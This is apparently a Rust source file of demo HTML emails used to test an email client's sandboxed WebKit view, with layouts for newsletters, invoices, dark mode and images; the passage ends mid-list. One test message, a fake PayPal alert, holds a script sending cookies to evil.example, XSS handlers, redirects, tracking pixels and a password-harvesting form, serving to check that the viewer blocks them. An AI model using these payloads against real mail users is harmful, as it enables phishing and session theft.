//! Correos HTML de demostración (solo compilaciones de depuración, `CORREO_DEMO=1`).
//! Sirven para probar la vista completa (WebKit): maquetación con tablas, estilos en línea,
//! `<style>` con colores propios, citas anidadas y un correo hostil que no debe ejecutar nada
//! ni pedir red. Ver `docs/DEVELOPMENT.md`.

use correo_core::{Address, Flags, MailboxId, MessageBody, MessageHeader};
use correo_store::Store;

/// Un correo de demo: remitente, asunto, antigüedad en minutos y cuerpo HTML y de texto.
struct DemoMail {
    from: (&'static str, &'static str),
    subject: &'static str,
    snippet: &'static str,
    age_minutes: i64,
    html: String,
    text: &'static str,
}

const NEWSLETTER: &str = r##"<!DOCTYPE html><html><head><meta charset="utf-8"><title>Boletín</title></head>
<body style="margin:0;padding:0;background-color:#f2f4f7;">
<table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="background-color:#f2f4f7;">
<tr><td align="center" style="padding:24px 8px;">
 <table role="presentation" width="600" cellpadding="0" cellspacing="0" style="max-width:600px;background:#ffffff;border-radius:8px;">
  <tr><td style="background:#3584e4;padding:28px 32px;border-radius:8px 8px 0 0;">
    <h1 style="margin:0;font-family:Arial,sans-serif;font-size:26px;color:#ffffff;">Semanario del Taller</h1>
    <p style="margin:6px 0 0;font-family:Arial,sans-serif;font-size:14px;color:#dbe9fb;">Número 42 · octubre</p>
  </td></tr>
  <tr><td style="padding:0;"><img src="https://boletin.ejemplo.invalid/cabecera.jpg" width="600" height="180" alt="Foto de cabecera del taller" style="display:block;width:100%;height:auto;background:#cfd8e3;"></td></tr>
  <tr><td style="padding:28px 32px 8px;font-family:Arial,sans-serif;font-size:16px;line-height:24px;color:#333333;">
    <h2 style="margin:0 0 12px;font-size:20px;color:#1a1a1a;">Novedades de la semana</h2>
    <p style="margin:0 0 16px;">Hemos estrenado la <b>sala de impresión 3D</b> y abrimos inscripciones para el curso de
    electrónica básica. Estas son las cifras del mes:</p>
  </td></tr>
  <tr><td style="padding:0 32px 8px;">
    <table width="100%" cellpadding="0" cellspacing="0" style="font-family:Arial,sans-serif;font-size:15px;">
     <tr>
      <td width="50%" valign="top" style="padding:0 8px 16px 0;">
        <table width="100%" cellpadding="12" cellspacing="0" style="background:#eef5ff;border:1px solid #d3e3fb;border-radius:6px;">
          <tr><td><span style="font-size:28px;font-weight:bold;color:#1c71d8;">128</span><br><span style="color:#555;">socios activos</span></td></tr>
        </table>
      </td>
      <td width="50%" valign="top" style="padding:0 0 16px 8px;">
        <table width="100%" cellpadding="12" cellspacing="0" style="background:#fff6e5;border:1px solid #f6e0b0;border-radius:6px;">
          <tr><td><span style="font-size:28px;font-weight:bold;color:#c64600;">14</span><br><span style="color:#555;">talleres este mes</span></td></tr>
        </table>
      </td>
     </tr>
    </table>
  </td></tr>
  <tr><td align="center" style="padding:8px 32px 28px;">
    <a href="https://boletin.ejemplo.invalid/inscripcion" style="display:inline-block;background:#26a269;color:#ffffff;font-family:Arial,sans-serif;font-size:16px;font-weight:bold;text-decoration:none;padding:12px 28px;border-radius:6px;">Inscribirme al curso</a>
  </td></tr>
  <tr><td style="padding:16px 32px;border-top:1px solid #e6e6e6;font-family:Arial,sans-serif;font-size:12px;color:#888888;text-align:center;">
    Recibes este boletín porque te suscribiste en nuestra web.<br>
    <a href="https://boletin.ejemplo.invalid/baja" style="color:#888888;">Darme de baja</a> ·
    <a href="https://boletin.ejemplo.invalid/web" style="color:#888888;">Ver en el navegador</a>
  </td></tr>
 </table>
</td></tr></table>
</body></html>"##;

const INVOICE: &str = r##"<div style="font-family:Helvetica,Arial,sans-serif;color:#222;max-width:640px;">
<p style="font-size:16px;">Hola,</p>
<p style="font-size:16px;">Ya está disponible tu factura <b>F-2026-1042</b> del periodo de octubre. Este es el desglose:</p>
<table width="100%" cellpadding="8" cellspacing="0" style="border-collapse:collapse;font-size:15px;margin:16px 0;">
 <thead>
  <tr style="background:#f0f0f0;text-align:left;">
    <th style="border-bottom:2px solid #cccccc;">Concepto</th>
    <th style="border-bottom:2px solid #cccccc;text-align:right;">Uds.</th>
    <th style="border-bottom:2px solid #cccccc;text-align:right;">Importe</th>
  </tr>
 </thead>
 <tbody>
  <tr><td style="border-bottom:1px solid #e5e5e5;">Suscripción mensual</td><td style="border-bottom:1px solid #e5e5e5;text-align:right;">1</td><td style="border-bottom:1px solid #e5e5e5;text-align:right;">29,00 €</td></tr>
  <tr><td style="border-bottom:1px solid #e5e5e5;">Almacenamiento extra (50 GB)</td><td style="border-bottom:1px solid #e5e5e5;text-align:right;">2</td><td style="border-bottom:1px solid #e5e5e5;text-align:right;">9,98 €</td></tr>
  <tr><td style="border-bottom:1px solid #e5e5e5;">IVA (21 %)</td><td style="border-bottom:1px solid #e5e5e5;text-align:right;">&nbsp;</td><td style="border-bottom:1px solid #e5e5e5;text-align:right;">8,19 €</td></tr>
 </tbody>
 <tfoot>
  <tr><td colspan="2" style="text-align:right;font-weight:bold;padding-top:12px;">Total</td><td style="text-align:right;font-weight:bold;font-size:18px;padding-top:12px;">47,17 €</td></tr>
 </tfoot>
</table>
<p style="text-align:center;margin:24px 0;">
  <a href="https://facturas.ejemplo.net/pagar/F-2026-1042" style="background:#1c71d8;color:#ffffff;text-decoration:none;padding:12px 26px;border-radius:6px;font-weight:bold;display:inline-block;">Pagar factura</a>
</p>
<p style="font-size:13px;color:#777;">El cargo se realizará el día 5 en tu cuenta terminada en 4821. Si tienes dudas, responde a este correo.</p>
</div>"##;

const QUOTES: &str = r##"<div>
<p>Perfecto, entonces lo dejamos para el jueves a las 10:00.</p>
<p>Un abrazo,<br>Marta</p>
<div style="margin-top:12px;">El mié, 14 oct 2026 a las 18:02, Luis Gómez &lt;luis@ejemplo.org&gt; escribió:</div>
<blockquote style="margin:0 0 0 .8ex;border-left:1px solid #ccc;padding-left:1ex;">
  <div>¿Os viene bien el jueves? Si no, podemos mover la reunión al viernes por la mañana.</div>
  <div style="margin-top:8px;">El mié, 14 oct 2026 a las 17:40, Ana Ruiz &lt;ana@ejemplo.com&gt; escribió:</div>
  <blockquote style="margin:0 0 0 .8ex;border-left:1px solid #ccc;padding-left:1ex;">
    <div>Yo puedo el jueves o el viernes, como prefiráis. Adjunto el orden del día:</div>
    <ul><li>Presupuesto del trimestre</li><li>Calendario de entregas</li><li>Ruegos y preguntas</li></ul>
    <div style="margin-top:8px;">El mié, 14 oct 2026 a las 17:15, Marta Solé &lt;marta@ejemplo.com&gt; escribió:</div>
    <blockquote style="margin:0 0 0 .8ex;border-left:1px solid #ccc;padding-left:1ex;">
      <div>Hola a todos, ¿cuándo quedamos para repasar las cifras?</div>
    </blockquote>
  </blockquote>
</blockquote>
</div>"##;

const DARK: &str = r##"<!DOCTYPE html><html><head><meta charset="utf-8">
<style>
  body { background:#0f1419; color:#e6e6e6; font-family:Georgia,serif; margin:0; }
  .wrap { max-width:560px; margin:0 auto; padding:28px 24px; }
  h1 { color:#7ee2b8; font-size:24px; letter-spacing:.5px; }
  .tarjeta { background:#1b2430; border-left:4px solid #7ee2b8; padding:14px 18px; border-radius:6px; margin:18px 0; }
  a.boton { display:inline-block; background:#7ee2b8; color:#0f1419; padding:10px 22px; border-radius:20px; text-decoration:none; font-weight:bold; }
  .pie { color:#8b97a5; font-size:13px; border-top:1px solid #2a3544; margin-top:28px; padding-top:12px; }
  @media (prefers-color-scheme: light) { .tarjeta { border-left-color:#3dc99a; } }
</style></head>
<body><div class="wrap">
  <h1>Modo noche activado</h1>
  <p>Este correo declara sus propios colores oscuros en una hoja de estilos: el fondo, el texto y las tarjetas
  no deben romperse dentro del lector.</p>
  <div class="tarjeta"><b>Resumen de tu semana</b><br>Has leído 42 correos y archivado 37. ¡Bandeja casi a cero!</div>
  <p><a class="boton" href="https://app.ejemplo.net/resumen">Ver resumen completo</a></p>
  <div class="pie">Enviado por Aurora Mail · <a href="https://app.ejemplo.net/baja" style="color:#7ee2b8;">cancelar suscripción</a></div>
</div></body></html>"##;

/// Imágenes PNG de demo (generadas, genéricas): un paisaje a color y tres iconos con
/// transparencia. Sirven para comprobar que la oscurización automática no las invierte.
const PNG_SCENE: &str = "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";
const PNG_ICON_OK: &str = "iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAAlUlEQVR42u2XQQ6AMAgE+xr/5rf8qMZjjSCw3YLGTXpl5kAotPa2LNu6ay8FSpWJwmEJFAyJjIa7JFhws0SqABuuSsyCixKfFDhjEmDBNYFOggVPEbDCXQKWYl64W+CpqBceEpCKR+DuHpAgUXioCa8wBB6eBXeZPglR+JBRjMDTf8R/I6q9lJZYy0scJmVOsxLHKTMHHeVvd7aLHNYAAAAASUVORK5CYII=";
const PNG_ICON_PLUS: &str = "iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAAcklEQVR42u3XQQ5AEQwEUJdyQ0d1D9YsRDsaozqJ7Z+XyJc2pdeSS22rc6XUFKMthxFoMQQ5XS5CWJVvI64CrMuXCOlH5sCIvwGae0QBA4IegCQAPgD+/4J4CSkAUgQCiImIeyilGMspFhOa1YxiObVMB0Sx27qs1dXVAAAAAElFTkSuQmCC";
const PNG_ICON_BAR: &str = "iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAAcklEQVR42u3XQQ7AIAgEQL7q5/sNe28jlsLKGiHxYkx2Tggiu9XVpGsnJRSK+RvuRniDXZDocBMCFf4ZkQpAh6uIVeFDxNmA1eEvRAEKMHv4LMtdAUJ6AQJg6oRnANK/45qIaIZSirGcYjGhWc0ollNk3Ttc11Ps0TguAAAAAElFTkSuQmCC";

/// Correo «consciente del modo oscuro»: declara `color-scheme` y trae sus reglas
/// `@media (prefers-color-scheme: dark)`; en tema oscuro debe usar esas reglas.
const AWARE: &str = r##"<!DOCTYPE html><html><head><meta charset="utf-8">
<meta name="color-scheme" content="light dark">
<meta name="supported-color-schemes" content="light dark">
<style>
  :root { color-scheme: light dark; }
  body { margin:0; background:#eef1f5; color:#1f2430; font-family:Helvetica,Arial,sans-serif; }
  .wrap { max-width:560px; margin:0 auto; padding:24px 16px; }
  .card { background:#ffffff; border:1px solid #d9dee6; border-radius:10px; padding:22px 24px; }
  h1 { margin:0 0 6px; font-size:24px; color:#14213d; }
  .sub { margin:0 0 16px; color:#5b6577; font-size:14px; }
  .dato { background:#e8f1ff; border-left:4px solid #2f6fdb; padding:10px 14px; margin:14px 0; border-radius:4px; }
  a { color:#1a5fd0; }
  a.btn { display:inline-block; background:#1a5fd0; color:#ffffff; padding:10px 22px; border-radius:20px; text-decoration:none; font-weight:bold; }
  .pie { color:#6b7585; font-size:12px; text-align:center; margin-top:16px; }
  @media (prefers-color-scheme: dark) {
    body { background:#14161a !important; color:#e6e8ec !important; }
    .card { background:#1f2329 !important; border-color:#323843 !important; }
    h1 { color:#ffffff !important; }
    .sub, .pie { color:#9aa4b2 !important; }
    .dato { background:#1d2d47 !important; border-left-color:#7fb0ff !important; }
    a { color:#8ab4f8 !important; }
    a.btn { background:#8ab4f8 !important; color:#0e1c33 !important; }
  }
</style></head>
<body><div class="wrap"><div class="card">
  <h1>Tu agenda de la semana</h1>
  <p class="sub">Correo con soporte de modo oscuro (color-scheme y prefers-color-scheme)</p>
  <p>Este mensaje declara que sabe de modo oscuro: en un tema oscuro debe verse con su propia
  paleta oscura (fondo casi negro, texto claro) y no pasar por la oscurización automática.</p>
  <div class="dato"><b>Martes 10:00</b> · Revisión de proyecto en la sala 2<br><b>Jueves 16:30</b> · Entrega de la propuesta</div>
  <p>Consulta los detalles en <a href="https://agenda.ejemplo.net/semana">tu agenda en línea</a>.</p>
  <p style="text-align:center;margin:22px 0 4px;"><a class="btn" href="https://agenda.ejemplo.net/abrir">Abrir agenda</a></p>
</div>
<div class="pie">Enviado por Agenda Ejemplo · <a href="https://agenda.ejemplo.net/baja">gestionar avisos</a></div>
</div></body></html>"##;

/// Texto negro sobre fondo blanco con imágenes e iconos: la oscurización automática debe
/// invertir los colores del texto y el fondo, pero no las imágenes raster.
const GALLERY: &str = r##"<div style="background:#ffffff;color:#000000;font-family:Georgia,serif;max-width:620px;padding:8px 4px;">
<h2 style="color:#000000;margin:0 0 8px;">Fotos del mes: sendero de la sierra</h2>
<p style="color:#000000;">Os dejo las fotos de la excursión del sábado. La luz de la tarde fue perfecta; el
paisaje de abajo tiene cielo azul, sol amarillo y colinas verdes: <b>si ves colores raros, algo falla</b>.</p>
<img src="data:image/png;base64,{{SCENE}}" width="360" alt="Paisaje de la sierra" style="display:block;margin:12px 0;border:1px solid #999999;">
<table cellpadding="6" cellspacing="0" style="color:#000000;font-size:15px;margin:10px 0;">
 <tr><td><img src="data:image/png;base64,{{OK}}" width="24" height="24" alt="ok"></td><td>Ruta completada (12 km)</td></tr>
 <tr><td><img src="data:image/png;base64,{{PLUS}}" width="24" height="24" alt="más"></td><td>Dos fotos nuevas en el álbum</td></tr>
 <tr><td><img src="data:image/png;base64,{{BAR}}" width="24" height="24" alt="gráfico"></td><td>Desnivel acumulado: 640 m</td></tr>
</table>
<div style="background-image:url(data:image/png;base64,{{SCENE}});background-size:cover;height:70px;border-radius:6px;margin:10px 0;"></div>
<p style="color:#000000;">Álbum completo: <a href="https://fotos.ejemplo.net/sierra">https://fotos.ejemplo.net/sierra</a> (enlace con el color por defecto).</p>
<p style="color:#444444;font-size:13px;border-top:1px solid #cccccc;padding-top:8px;">Un saludo, Elena · Club de Montaña</p>
</div>"##;

/// Estilo transaccional: cabecera de color, botones de colores y tablas.
const ORDER: &str = r##"<!DOCTYPE html><html><body bgcolor="#f4f4f4" style="margin:0;padding:0;font-family:Arial,Helvetica,sans-serif;">
<table width="100%" cellpadding="0" cellspacing="0" bgcolor="#f4f4f4"><tr><td align="center" style="padding:20px 8px;">
<table width="580" cellpadding="0" cellspacing="0" bgcolor="#ffffff" style="max-width:580px;border:1px solid #dddddd;">
 <tr><td bgcolor="#7b3fe4" style="padding:22px 28px;color:#ffffff;font-size:22px;font-weight:bold;">Tienda Ejemplo <span style="font-weight:normal;font-size:14px;color:#e5d9fb;">· Pedido confirmado</span></td></tr>
 <tr><td style="padding:24px 28px 8px;color:#333333;font-size:15px;line-height:22px;">
   <p style="margin:0 0 10px;">Hola, hemos recibido tu pedido <b>#A-10293</b>. Resumen:</p>
 </td></tr>
 <tr><td style="padding:0 28px;">
  <table width="100%" cellpadding="8" cellspacing="0" style="font-size:14px;color:#333333;border-collapse:collapse;">
   <tr bgcolor="#eeeeee"><th align="left">Artículo</th><th align="center">Estado</th><th align="right">Precio</th></tr>
   <tr><td style="border-bottom:1px solid #e0e0e0;">Cuaderno de tapa dura</td><td align="center" style="border-bottom:1px solid #e0e0e0;"><span style="background:#d4f5e2;color:#0d6b3a;padding:2px 10px;border-radius:10px;font-size:12px;">En stock</span></td><td align="right" style="border-bottom:1px solid #e0e0e0;">12,50 €</td></tr>
   <tr><td style="border-bottom:1px solid #e0e0e0;">Lámpara de escritorio</td><td align="center" style="border-bottom:1px solid #e0e0e0;"><span style="background:#fff0cc;color:#8a5a00;padding:2px 10px;border-radius:10px;font-size:12px;">Pocas unidades</span></td><td align="right" style="border-bottom:1px solid #e0e0e0;">34,90 €</td></tr>
   <tr><td style="border-bottom:1px solid #e0e0e0;">Auriculares</td><td align="center" style="border-bottom:1px solid #e0e0e0;"><span style="background:#fde0e0;color:#a31515;padding:2px 10px;border-radius:10px;font-size:12px;">Reservado</span></td><td align="right" style="border-bottom:1px solid #e0e0e0;">59,00 €</td></tr>
   <tr><td colspan="2" align="right"><b>Total</b></td><td align="right"><b style="font-size:17px;">106,40 €</b></td></tr>
  </table>
 </td></tr>
 <tr><td align="center" style="padding:22px 28px;">
  <a href="https://tienda.ejemplo.net/pedido/A-10293" style="display:inline-block;background:#26a269;color:#ffffff;text-decoration:none;font-weight:bold;padding:12px 22px;border-radius:5px;margin:4px;">Ver pedido</a>
  <a href="https://tienda.ejemplo.net/seguimiento" style="display:inline-block;background:#1c71d8;color:#ffffff;text-decoration:none;font-weight:bold;padding:12px 22px;border-radius:5px;margin:4px;">Seguir envío</a>
  <a href="https://tienda.ejemplo.net/cancelar" style="display:inline-block;background:#e01b24;color:#ffffff;text-decoration:none;font-weight:bold;padding:12px 22px;border-radius:5px;margin:4px;">Cancelar</a>
  <a href="https://tienda.ejemplo.net/ayuda" style="display:inline-block;background:#f6d32d;color:#241f31;text-decoration:none;font-weight:bold;padding:12px 22px;border-radius:5px;margin:4px;">Ayuda</a>
 </td></tr>
 <tr><td bgcolor="#fafafa" style="padding:14px 28px;border-top:1px solid #e5e5e5;font-size:12px;color:#777777;text-align:center;">
   Tienda Ejemplo · Calle Falsa 123 · <a href="https://tienda.ejemplo.net/privacidad" style="color:#3465a4;">Privacidad</a>
 </td></tr>
</table></td></tr></table>
</body></html>"##;

/// Puerto local del «rastreador»: el correo hostil lo referencia y la vista NO debe pedirlo.
const HOSTILE: &str = r##"<html><head><title>Aviso de seguridad</title>
<meta http-equiv="refresh" content="0; url=https://evil.example/redirect">
<base href="https://evil.example/">
<link rel="stylesheet" href="http://127.0.0.1:8099/hoja.css">
<script>document.location = 'https://evil.example/robo?c=' + document.cookie;</script>
</head>
<body onload="document.location='https://evil.example/onload'">
<h2 style="font-family:Arial,sans-serif;">Verifica tu cuenta ahora</h2>
<p style="font-family:Arial,sans-serif;">Hemos detectado un acceso inusual. Para evitar el bloqueo, confirma tus datos:</p>
<p><a href="https://evil.example" target="_blank">https://paypal.com</a></p>
<p><a href="javascript:alert('xss')">Pulsa aquí para verificar</a></p>
<iframe src="http://127.0.0.1:8099/marco.html" width="300" height="100"></iframe>
<object data="http://127.0.0.1:8099/objeto.swf"></object>
<embed src="http://127.0.0.1:8099/embed.swf">
<form action="https://evil.example/post" method="post">
  <input type="text" name="usuario" value="usuario"> <input type="password" name="clave">
  <button type="submit">Iniciar sesión</button>
</form>
<img src="http://127.0.0.1:8099/seguimiento.gif?id=demo" width="1" height="1" alt="">
<img src="https://rastreo.evil.example/pixel.gif" width="1" height="1" alt="">
<div style="width:200px;height:40px;background:url('http://127.0.0.1:8099/fondo.png');color:#900">Texto con fondo remoto</div>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><script>alert(2)</script></svg>
</body></html>"##;

fn mails() -> Vec<DemoMail> {
    vec![
        DemoMail {
            from: ("Semanario del Taller", "boletin@ejemplo.net"),
            subject: "Boletín nº 42: sala de impresión 3D y nuevos cursos",
            snippet: "Hemos estrenado la sala de impresión 3D y abrimos inscripciones.",
            age_minutes: 2,
            html: NEWSLETTER.into(),
            text: "Semanario del Taller, número 42.\n\nHemos estrenado la sala de impresión 3D.",
        },
        DemoMail {
            from: ("Equipo de Facturación", "facturas@ejemplo.net"),
            subject: "Factura F-2026-1042 disponible",
            snippet: "Ya está disponible tu factura del periodo de octubre.",
            age_minutes: 3,
            html: INVOICE.into(),
            text: "Tu factura F-2026-1042 ya está disponible. Total: 47,17 EUR.",
        },
        DemoMail {
            from: ("Marta Solé", "marta@ejemplo.com"),
            subject: "Re: Re: Re: Reunión del jueves",
            snippet: "Perfecto, entonces lo dejamos para el jueves a las 10:00.",
            age_minutes: 4,
            html: QUOTES.into(),
            text: "Perfecto, entonces lo dejamos para el jueves a las 10:00.",
        },
        DemoMail {
            from: ("Aurora Mail", "hola@aurora.example"),
            subject: "Tu resumen semanal (tema oscuro propio)",
            snippet: "Has leído 42 correos y archivado 37.",
            age_minutes: 5,
            html: DARK.into(),
            text: "Resumen de tu semana: 42 correos leídos, 37 archivados.",
        },
        DemoMail {
            from: ("Seguridad de PayPal", "seguridad@paypa1-aviso.example"),
            subject: "URGENTE: verifica tu cuenta (correo hostil de prueba)",
            snippet: "Hemos detectado un acceso inusual en tu cuenta.",
            age_minutes: 6,
            html: HOSTILE.into(),
            text: "Verifica tu cuenta ahora.",
        },
        DemoMail {
